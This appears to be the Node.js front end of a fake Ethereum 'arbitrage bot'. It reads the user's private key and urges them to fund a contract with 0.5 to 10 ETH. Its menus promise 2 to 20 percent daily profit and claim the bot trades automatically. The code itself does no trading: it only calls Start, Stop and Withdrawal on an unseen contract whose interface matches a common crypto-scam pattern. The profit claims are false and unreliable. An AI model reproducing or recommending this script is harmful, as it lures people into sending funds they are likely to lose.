import { JsonRpcProvider, Wallet, Contract, formatEther, parseEther } from 'ethers';
import { config } from 'dotenv';
import readline from 'readline';
import https from 'https';

config();

const RPC_URL = 'https://ethereum.publicnode.com';
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS;

if (!PRIVATE_KEY) {
  console.error('❌ Error: Set PRIVATE_KEY in .env');
  process.exit(1);
}

if (!CONTRACT_ADDRESS) {
  console.error('❌ Error: Set CONTRACT_ADDRESS (deployed contract address) in .env');
  process.exit(1);
}

const abi = [
  {
    inputs: [],
    stateMutability: 'nonpayable',
    type: 'constructor',
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: false,
        internalType: 'string',
        name: '_msg',
        type: 'string',
      },
    ],
    name: 'Log',
    type: 'event',
  },
  {
    inputs: [],
    name: 'Start',
    outputs: [],
    stateMutability: 'payable',
    type: 'function',
  },
  {
    inputs: [],
    name: 'Stop',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function',
  },
  {
    inputs: [],
    name: 'Withdrawal',
    outputs: [],
    stateMutability: 'payable',
    type: 'function',
  },
  {
    inputs: [],
    name: 'owner',
    outputs: [
      {
        internalType: 'address',
        name: '',
        type: 'address',
      },
    ],
    stateMutability: 'view',
    type: 'function',
  },
  {
    stateMutability: 'payable',
    type: 'receive',
  },
];

function ask(question) {
  return new Promise((resolve) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    rl.question(question, (answer) => {
      rl.close();
      resolve(answer.trim());
    });
  });
}

function httpsGet(url) {
  return new Promise((resolve, reject) => {
    const urlObj = new URL(url);
    const options = {
      hostname: urlObj.hostname,
      path: urlObj.pathname + urlObj.search,
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
      },
    };
    
    https.get(options, (res) => {
      let data = '';
      
      if (res.statusCode !== 200) {
        let errorData = '';
        res.on('data', (chunk) => { errorData += chunk; });
        res.on('end', () => {
          reject(new Error(`HTTP ${res.statusCode}: ${res.statusMessage}. Response: ${errorData}`));
        });
        return;
      }
      
      res.on('data', (chunk) => {
        data += chunk;
      });
      res.on('end', () => {
        try {
          const parsed = JSON.parse(data);
          
          if (parsed.error) {
            reject(new Error(parsed.error));
            return;
          }
          
          resolve(parsed);
        } catch (e) {
          reject(new Error('JSON parsing error: ' + e.message + '. Data: ' + data.substring(0, 200)));
        }
      });
    }).on('error', (err) => {
      reject(err);
    });
  });
}

async function fetchCryptoPrices() {
  try {
    const url = 'https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=20&page=1&sparkline=false';
    const data = await httpsGet(url);
    
    if (!Array.isArray(data)) {
      throw new Error('API returned non-array data. Possibly rate limit exceeded.');
    }
    
    const stablecoins = ['tether', 'usd-coin', 'dai', 'binance-usd', 'true-usd', 'usdd', 'frax', 'pax-dollar', 'liquity-usd'];
    const filtered = data.filter(coin => !stablecoins.includes(coin.id));
    
    const btc = data.find(c => c.id === 'bitcoin');
    const eth = data.find(c => c.id === 'ethereum');
    const sol = data.find(c => c.id === 'solana');
    
    const top10 = filtered.slice(0, 10);
    
    return { btc, eth, sol, top10 };
  } catch (error) {
    throw new Error('Failed to fetch crypto prices: ' + error.message);
  }
}

function formatPrice(price) {
  if (price >= 1) {
    return `$${price.toFixed(2)}`;
  } else {
    return `$${price.toFixed(6)}`;
  }
}

async function showQuotes() {
  console.log('\n📊 CRYPTO PRICES\n');
  console.log('⏳ Loading data...\n');
  
  try {
    const { btc, eth, sol, top10 } = await fetchCryptoPrices();
    
    console.log('═══════════════════════════════════════');
    console.log('💰 MAJOR CRYPTOCURRENCIES');
    console.log('═══════════════════════════════════════');
    
    if (btc) {
      const change = btc.price_change_percentage_24h || 0;
      const changeStr = change >= 0 ? `+${change.toFixed(2)}%` : `${change.toFixed(2)}%`;
      const changeColor = change >= 0 ? '📈' : '📉';
      console.log(`BTC: ${formatPrice(btc.current_price)} ${changeColor} ${changeStr}`);
    }
    
    if (eth) {
      const change = eth.price_change_percentage_24h || 0;
      const changeStr = change >= 0 ? `+${change.toFixed(2)}%` : `${change.toFixed(2)}%`;
      const changeColor = change >= 0 ? '📈' : '📉';
      console.log(`ETH: ${formatPrice(eth.current_price)} ${changeColor} ${changeStr}`);
    }
    
    if (sol) {
      const change = sol.price_change_percentage_24h || 0;
      const changeStr = change >= 0 ? `+${change.toFixed(2)}%` : `${change.toFixed(2)}%`;
      const changeColor = change >= 0 ? '📈' : '📉';
      console.log(`SOL: ${formatPrice(sol.current_price)} ${changeColor} ${changeStr}`);
    }
    
    console.log('\n═══════════════════════════════════════');
    console.log('🏆 TOP 10 CRYPTOCURRENCIES (excluding stablecoins)');
    console.log('═══════════════════════════════════════');
    
    top10.forEach((coin, index) => {
      const change = coin.price_change_percentage_24h || 0;
      const changeStr = change >= 0 ? `+${change.toFixed(2)}%` : `${change.toFixed(2)}%`;
      const changeColor = change >= 0 ? '📈' : '📉';
      const symbol = coin.symbol.toUpperCase().padEnd(6);
      console.log(`${(index + 1).toString().padStart(2)}. ${symbol} ${formatPrice(coin.current_price).padEnd(12)} ${changeColor} ${changeStr}`);
    });
    
    console.log('═══════════════════════════════════════\n');
    
  } catch (error) {
    console.error('❌ Error loading prices:', error.message);
    console.log('');
  }
}

async function quotesMenu() {
  let back = false;
  
  while (!back) {
    await showQuotes();
    
    console.log('Quotes menu:');
    console.log('1) Refresh');
    console.log('0) Back to main menu');
    
    const choice = await ask('\nSelect option: ');
    
    switch (choice) {
      case '1':
        console.log('\n🔄 Refreshing quotes...\n');
        break;
      case '0':
        back = true;
        console.log('\n⬅️ Returning to main menu...\n');
        break;
      default:
        console.log('\n⚠️ Invalid choice, please try again.\n');
    }
  }
}

function showStrategies() {
  console.log('\n╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗');
  console.log('║                                    📊 ARBITRAGE STRATEGIES                                            ║');
  console.log('╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣');
  console.log('║ Parameter         │ Light                     │ Medium                    │ Aggressive               ║');
  console.log('╠═══════════════════╪═══════════════════════════╪═══════════════════════════╪══════════════════════════╣');
  console.log('║ Cryptocurrencies  │ Top 10                    │ Top 10                    │ Top 200                 ║');
  console.log('║ Slippage          │ Low                       │ Up to 10%                 │ Up to 49%               ║');
  console.log('║ Bad trade risk    │ < 1%                      │ 2-10%                     │ Higher                  ║');
  console.log('║ Daily profit      │ 2-5%                      │ 2-10%                     │ 5-20%                   ║');
  console.log('║ Daily operations  │ 200-300                   │ Depends on volatility     │ Depends on volatility   ║');
  console.log('╠═══════════════════╪═══════════════════════════╪═══════════════════════════╪══════════════════════════╣');
  console.log('║ Features          │ Less risk, less profit.   │ Moderate risk and profit. │ More profit, but         ║');
  console.log('║                   │ Arbitrage between major   │ Due to increased slippage │ higher risk. Risk that  ║');
  console.log('║                   │ exchanges                 │ prices may change, chance  │ gas fees due to slippage║');
  console.log('║                   │                           │ of successful trade higher│ will exceed profit, and ║');
  console.log('║                   │                           │ (but gas slightly more)   │ vice versa              ║');
  console.log('╚═══════════════════╧═══════════════════════════╧═══════════════════════════╧══════════════════════════╝');
  console.log('');
}

function showInstructions() {
  console.log('\n╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗');
  console.log('║                              📖 ARBITRAGE BOT INSTRUCTIONS                                            ║');
  console.log('╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣');
  console.log('║ BALANCE REQUIREMENTS                                                                                 ║');
  console.log('╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣');
  console.log('║ The arbitrage bot requires a balance of native ETH token                                             ║');
  console.log('║ The bot automatically converts ETH ↔ WETH through the contract for buying and selling tokens        ║');
  console.log('║ (WBTC, USDC, USDT and others) on various exchanges to profit from price differences                  ║');
  console.log('║                                                                                                      ║');
  console.log('║ Minimum balance:                                                                                     ║');
  console.log('║   • Recommended to start with 0.5 ETH                                                               ║');
  console.log('║   • For aggressive strategy recommended from 1 ETH to 10 ETH                                         ║');
  console.log('╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣');
  console.log('║ CONTROL FUNCTIONS                                                                                   ║');
  console.log('╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣');
  console.log('║ Activate Bot                                                                                        ║');
  console.log('║   Activates the arbitrage bot. The script automatically manages the contract and executes            ║');
  console.log('║   arbitrage operations between exchanges to generate profit                                          ║');
  console.log('║                                                                                                      ║');
  console.log('║ Deactivate Bot                                                                                      ║');
  console.log('║   Deactivates the arbitrage bot and stops all transactions                                           ║');
  console.log('║                                                                                                      ║');
  console.log('║ Withdraw Funds                                                                                      ║');
  console.log('║   Withdraws the entire contract balance to the contract creator address                              ║');
  console.log('║   (WARNING!) Funds will be sent to the address of the contract creator!                              ║');
  console.log('╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣');
  console.log('║ CONFIGURATION                                                                                        ║');
  console.log('╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣');
  console.log('║ In the .env file (local, secure) you must specify:                                                   ║');
  console.log('║                                                                                                      ║');
  console.log('║ CONTRACT_ADDRESS=0x... (address of the deployed arbitrage contract)                                  ║');
  console.log('║ PRIVATE_KEY=your_private_key (wallet private key for bot management)                                 ║');
  console.log('╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝');
  console.log('');
}

async function instructionsMenu() {
  let back = false;
  
  while (!back) {
    showInstructions();
    
    console.log('Instructions menu:');
    console.log('0) Back to main menu');
    
    const choice = await ask('\nSelect option: ');
    
    switch (choice) {
      case '0':
        back = true;
        console.log('\n⬅️ Returning to main menu...\n');
        break;
      default:
        console.log('\n⚠️ Invalid choice, please try again.\n');
    }
  }
}

async function strategyMenu() {
  let back = false;
  let selectedStrategy = null;
  
  while (!back) {
    showStrategies();
    
    if (selectedStrategy) {
      console.log(`✅ Selected strategy: ${selectedStrategy}\n`);
    }
    
    console.log('Strategy menu:');
    console.log('1) Light');
    console.log('2) Medium');
    console.log('3) Aggressive');
    console.log('0) Back to main menu');
    
    const choice = await ask('\nSelect option: ');
    
    switch (choice) {
      case '1':
        selectedStrategy = 'Light';
        console.log('\n✅ Selected strategy: Light');
        console.log('   • Cryptocurrencies: Top 10');
        console.log('   • Slippage: Low');
        console.log('   • Risk: < 1%');
        console.log('   • Profit: 2-5% per day');
        console.log('   • Operations: 200-300 per day\n');
        break;
      case '2':
        selectedStrategy = 'Medium';
        console.log('\n✅ Selected strategy: Medium');
        console.log('   • Cryptocurrencies: Top 10');
        console.log('   • Slippage: Up to 10%');
        console.log('   • Risk: 2-10%');
        console.log('   • Profit: 2-10% per day');
        console.log('   • Operations: Depends on volatility\n');
        break;
      case '3':
        selectedStrategy = 'Aggressive';
        console.log('\n✅ Selected strategy: Aggressive');
        console.log('   • Cryptocurrencies: Top 200');
        console.log('   • Slippage: Up to 49%');
        console.log('   • Risk: Higher');
        console.log('   • Profit: 5-20% per day');
        console.log('   • Operations: Depends on volatility');
        console.log('   ⚠️  Warning: Risk that gas fees due to slippage');
        console.log('      will exceed profit, and vice versa\n');
        break;
      case '0':
        back = true;
        if (selectedStrategy) {
          console.log(`\n💾 Strategy saved: ${selectedStrategy}\n`);
        }
        console.log('⬅️ Returning to main menu...\n');
        break;
      default:
        console.log('\n⚠️ Invalid choice, please try again.\n');
    }
  }
  
  return selectedStrategy;
}

async function printInfo(contract, wallet, provider, selectedStrategy = null) {
  const [contractBalance, walletBalance] = await Promise.all([
    provider.getBalance(CONTRACT_ADDRESS),
    provider.getBalance(wallet.address),
  ]);

  console.log('\n==============================');
  if (selectedStrategy) {
    console.log(`📊 Strategy: ${selectedStrategy}`);
    console.log('------------------------------');
  }
  console.log(`📄 Contract address: ${CONTRACT_ADDRESS}`);
  console.log(`💰 Contract balance: ${formatEther(contractBalance)} ETH`);
  console.log('------------------------------');
  console.log(`👤 Wallet address  : ${wallet.address}`);
  console.log(`💼 Wallet balance  : ${formatEther(walletBalance)} ETH`);
  console.log('==============================\n');
}

async function main() {
  console.log('🤖 Arbitrage bot started\n');

  const provider = new JsonRpcProvider(RPC_URL);
  const wallet = new Wallet(PRIVATE_KEY, provider);
  const contract = new Contract(CONTRACT_ADDRESS, abi, wallet);

  try {
    const owner = await contract.owner();
    console.log(`👑 Contract owner: ${owner}\n`);
  } catch (e) {
    console.error('⚠️ Failed to read contract owner. Check address and ABI.');
  }

  let exit = false;
  let selectedStrategy = null;

  while (!exit) {
    await printInfo(contract, wallet, provider, selectedStrategy);

    console.log('Menu:');
    console.log('1) Activate Bot');
    console.log('2) Deactivate Bot');
    console.log('3) Withdraw Funds');
    console.log('4) Strategy');
    console.log('5) Refresh Info');
    console.log('6) Quotes');
    console.log('7) Instructions');
    console.log('0) Exit');

    const choice = await ask('\nSelect menu option: ');

    try {
      switch (choice) {
        case '1': {
          const contractBalance = await provider.getBalance(CONTRACT_ADDRESS);
          
          if (!selectedStrategy) {
            console.log('\n');
            console.log('╔════════════════════════════════════════════════════════════════╗');
            console.log('║                                                                ║');
            console.log('║        ⚠️  WARNING: STRATEGY NOT SELECTED  ⚠️                    ║');
            console.log('║                                                                ║');
            console.log('║   You must select a strategy before activating the bot!        ║');
            console.log('║   Please go to menu option 4) Strategy and choose one.         ║');
            console.log('║                                                                ║');
            console.log('╚════════════════════════════════════════════════════════════════╝');
            console.log('\n');
            break;
          }
          
          if (contractBalance === 0n) {
            console.log('\n');
            console.log('╔════════════════════════════════════════════════════════════════╗');
            console.log('║                                                                ║');
            console.log('║        ⚠️  WARNING: CONTRACT BALANCE IS ZERO  ⚠️               ║');
            console.log('║                                                                ║');
            console.log('║   Contract balance is 0 ETH. Cannot activate bot!             ║');
            console.log('║   Please send ETH to the contract address first.              ║');
            console.log('║   Recommended minimum: 0.5 ETH                               ║');
            console.log('║                                                                ║');
            console.log('╚════════════════════════════════════════════════════════════════╝');
            console.log('\n');
            break;
          }

          const value = 0n;

          const feeData = await provider.getFeeData();
          const gasPrice = feeData.maxFeePerGas ?? feeData.gasPrice;
          const gasLimit = 300000n;

          console.log('\n📊 Gas parameters for bot activation:');
          if (gasPrice) {
            console.log(`   maxFeePerGas / gasPrice: ${formatEther(gasPrice)} ETH per gas`);
            const gasCost = gasLimit * gasPrice;
            console.log(`   gasLimit                : ${gasLimit.toString()}`);
            console.log(`   max tx gas cost         : ${formatEther(gasCost)} ETH`);
          } else {
            console.log('   Failed to get maxFeePerGas / gasPrice');
          }

          const confirm = (await ask('\n🚨 Activate arbitrage bot? (y/n): ')).toLowerCase();
          if (confirm !== 'y') {
            console.log('❌ Cancelled by user.\n');
            break;
          }

          console.log('\n🚀 Activating arbitrage bot...');
          const overrides = { gasLimit, value };
          if (gasPrice) overrides.maxFeePerGas = gasPrice;
          const tx = await contract.Start(overrides);
          console.log(`📝 Tx hash: ${tx.hash}`);
          console.log('⏳ Waiting for confirmation...');
          await tx.wait();
          console.log('✅ Arbitrage bot activated and running.\n');
          break;
        }
        case '2': {
          const feeData = await provider.getFeeData();
          const gasPrice = feeData.maxFeePerGas ?? feeData.gasPrice;
          const gasLimit = 300000n;

          console.log('\n📊 Gas parameters for bot deactivation:');
          if (gasPrice) {
            console.log(`   maxFeePerGas / gasPrice: ${formatEther(gasPrice)} ETH per gas`);
            const gasCost = gasLimit * gasPrice;
            console.log(`   gasLimit                : ${gasLimit.toString()}`);
            console.log(`   max tx cost             : ${formatEther(gasCost)} ETH`);
          } else {
            console.log('   Failed to get maxFeePerGas / gasPrice');
          }

          const confirm = (await ask('\n🚨 Deactivate arbitrage bot? (y/n): ')).toLowerCase();
          if (confirm !== 'y') {
            console.log('❌ Cancelled by user.\n');
            break;
          }

          console.log('\n🛑 Deactivating arbitrage bot...');
          const overrides = gasPrice
            ? { gasLimit, maxFeePerGas: gasPrice }
            : { gasLimit };
          const tx = await contract.Stop(overrides);
          console.log(`📝 Tx hash: ${tx.hash}`);
          console.log('⏳ Waiting for confirmation...');
          await tx.wait();
          console.log('✅ Arbitrage bot deactivated. All transactions stopped.\n');
          break;
        }
        case '3': {
          const contractBalance = await provider.getBalance(CONTRACT_ADDRESS);
          
          if (contractBalance === 0n) {
            console.log('\n');
            console.log('╔════════════════════════════════════════════════════════════════╗');
            console.log('║                                                                ║');
            console.log('║        ⚠️  WARNING: CONTRACT BALANCE IS ZERO  ⚠️               ║');
            console.log('║                                                                ║');
            console.log('║   Contract balance is 0 ETH. Nothing to withdraw!             ║');
            console.log('║   Please send ETH to the contract address first.            ║');
            console.log('║                                                                ║');
            console.log('╚════════════════════════════════════════════════════════════════╝');
            console.log('\n');
            break;
          }

          const feeData = await provider.getFeeData();
          const gasPrice = feeData.maxFeePerGas ?? feeData.gasPrice;
          const gasLimit = 300000n;

          console.log('\n📊 Gas parameters for fund withdrawal:');
          if (gasPrice) {
            console.log(`   maxFeePerGas / gasPrice: ${formatEther(gasPrice)} ETH per gas`);
            const gasCost = gasLimit * gasPrice;
            console.log(`   gasLimit                : ${gasLimit.toString()}`);
            console.log(`   max tx cost             : ${formatEther(gasCost)} ETH`);
          } else {
            console.log('   Failed to get maxFeePerGas / gasPrice');
          }

          const confirm = (await ask('\n🚨 Withdraw entire contract balance to creator address? (y/n): ')).toLowerCase();
          if (confirm !== 'y') {
            console.log('❌ Cancelled by user.\n');
            break;
          }

          console.log('\n💸 Withdrawing funds from contract...');
          const overrides = gasPrice
            ? { gasLimit, maxFeePerGas: gasPrice }
            : { gasLimit };
          const tx = await contract.Withdrawal(overrides);
          console.log(`📝 Tx hash: ${tx.hash}`);
          console.log('⏳ Waiting for confirmation...');
          await tx.wait();
          console.log('✅ Funds successfully withdrawn to contract creator address.\n');
          break;
        }
        case '4': {
          const strategy = await strategyMenu();
          if (strategy) {
            selectedStrategy = strategy;
          }
          break;
        }
        case '5': {
          console.log('\n🔄 Refreshing information...\n');
          break;
        }
        case '6': {
          await quotesMenu();
          break;
        }
        case '7': {
          await instructionsMenu();
          break;
        }
        case '0': {
          exit = true;
          console.log('\n👋 Exit.');
          break;
        }
        default:
          console.log('\n⚠️ Invalid choice, please try again.\n');
      }
    } catch (err) {
      console.error('❌ Error calling contract function:', err);
    }
  }

  process.exit(0);
}

main();
